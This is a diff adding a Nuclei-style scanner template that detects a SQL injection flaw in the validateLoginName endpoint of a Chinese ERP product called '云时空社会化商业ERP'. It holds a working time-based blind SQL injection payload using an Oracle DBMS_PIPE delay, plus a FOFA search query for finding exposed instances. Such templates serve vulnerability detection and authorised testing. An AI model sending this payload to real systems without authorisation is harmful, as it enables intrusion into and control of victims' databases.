@@ -1,0 +1,42 @@
+id: YunshikongERP-validateLoginName-sqli
+
+info:
+  name: 云时空社会化商业ERP-validateLoginName-SQL注入
+  author: candada
+  severity: high
+  description: '云时空社会化商业ERP validateLoginName接口存在SQL注入漏洞。未授权的攻击者可以通过该漏洞执行恶意sql语句，从而控制数据库。'
+  reference:
+  tags: 2024,云时空社会化商业ERP,sqli
+  metadata:
+    max-request: 1
+    fofa-query: title="云时空社会化商业ERP系统"
+    verified: true
+  classification:
+    cvss-metrics: 
+    cvss-score:                                                   
+    cve-id:                                              
+    cwe-id:                                                    
+    epss-score:                                              
+    epss-percentile:                                           
+    cpe: 
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /sys/user/validateLoginName?loginName=admin'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)-- HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+    User-Agent: Mozilla/5.0
+
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+  - type: dsl
+    dsl:
+    - "status_code == 200 && duration>=5 && duration<=6"
+    condition: and
+
+
+# Generated From WebFuzzer on 2024-05-07 09:20:53
